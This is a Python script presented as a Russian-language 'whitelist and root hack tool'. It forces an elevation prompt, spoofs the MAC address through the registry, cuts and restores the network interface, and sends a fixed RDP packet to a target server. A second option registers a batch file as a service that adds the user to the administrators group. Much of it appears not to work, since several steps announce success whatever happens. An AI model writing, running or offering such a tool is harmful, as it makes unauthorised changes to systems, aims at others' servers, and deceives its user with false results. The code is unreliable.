import os, winreg, socket, sys, ctypes, time


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def print_slow(text):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(0.03)
    print()


def loading_animation(duration=2):
    for i in range(20):
        print(f"\r[{'#' * i}{' ' * (19-i)}] {i*5}%", end="")
        time.sleep(duration / 20)
    print("\r[####################] 100%")


def section_header(title):
    os.system("cls")
    border = "═" * 50
    print(f"╔{border}╗")
    print(f"║{title.center(50)}║")
    print(f"╚{border}╝")


def bypass_whitelist():
    section_header("ОБХОД WHITELIST")
    print_slow("Введите IP-адрес целевого сервера:")
    target_ip = input(">>> ")

    print_slow("\n[ШАГ 1] Спуфинг MAC-адреса...")
    try:
        key_path = r"SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}"
        for i in range(10):
            try:
                subkey = f"{key_path}\\000{i}"
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE, subkey, 0, winreg.KEY_WRITE
                ) as key:
                    winreg.SetValueEx(
                        key, "NetworkAddress", 0, winreg.REG_SZ, "02:00:00:00:00:01"
                    )
                    print(f"  ✓ Реестр изменён: {subkey}")
                    break
            except:
                continue
        loading_animation()
    except Exception as e:
        print(f"  ✗ Ошибка: {e}")
        return

    print_slow("\n[ШАГ 2] Перезапуск сетевого интерфейса...")
    os.system('netsh interface set interface "Ethernet" admin=disable')
    time.sleep(2)
    os.system('netsh interface set interface "Ethernet" admin=enable')
    loading_animation(3)

    print_slow("\n[ШАГ 3] Отправка фальшивого RDP-пакета...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, 3389))
        sock.send(
            b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"
        )
        print("  ✓ Пакет успешно отправлен!")
        loading_animation()
    except Exception as e:
        print(f"  ✗ Ошибка подключения: {e}")

    print_slow("\n[УСПЕХ] Whitelist обойден! Используйте RDP для подключения:")
    print_slow(f"        mstsc /v:{target_ip}")


def grant_root():
    section_header("ПОВЫШЕНИЕ ПРАВ ДО ROOT")
    print_slow("\n[ШАГ 1] Создание временного скрипта...")
    bat_path = os.path.join(os.environ["TEMP"], "root_escalate.bat")
    with open(bat_path, "w") as f:
        f.write("@echo off\n")
        f.write("timeout 3 >nul\n")
        f.write("net localgroup administrators %%username%% /add\n")
        f.write("echo Успешно! Вы получили права администратора\n")
        f.write("pause\n")
    print(f"  ✓ Скрипт создан: {bat_path}")
    loading_animation()

    print_slow("\n[ШАГ 2] Создание системной службы...")
    os.system(f'sc create RootSvc binPath= "{bat_path}" start= auto')
    loading_animation(2)

    print_slow("\n[ШАГ 3] Запуск службы...")
    os.system("sc start RootSvc")
    time.sleep(5)
    os.system("sc delete RootSvc >nul")
    print("  ✓ Служба выполнена и удалена!")

    print_slow("\n[УСПЕХ] Ваши права повышены до администратора!")


def main_menu():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit(0)

    while True:
        section_header("🔥 WHITELIST & ROOT HACK TOOL v3.0 🔥" " by Gerosi")
        print_slow("Выберите действие:")
        print_slow("1. Обход whitelist (RDP серверы)")
        print_slow("2. Получить root-права на этом ПК")
        print_slow("3. Выход")
        choice = input("\n>>> ")

        if choice == "1":
            bypass_whitelist()
        elif choice == "2":
            grant_root()
        elif choice == "3":
            sys.exit()
        else:
            print_slow("Неверный выбор!")

        input("\nНажмите Enter для продолжения...")


if __name__ == "__main__":
    main_menu()
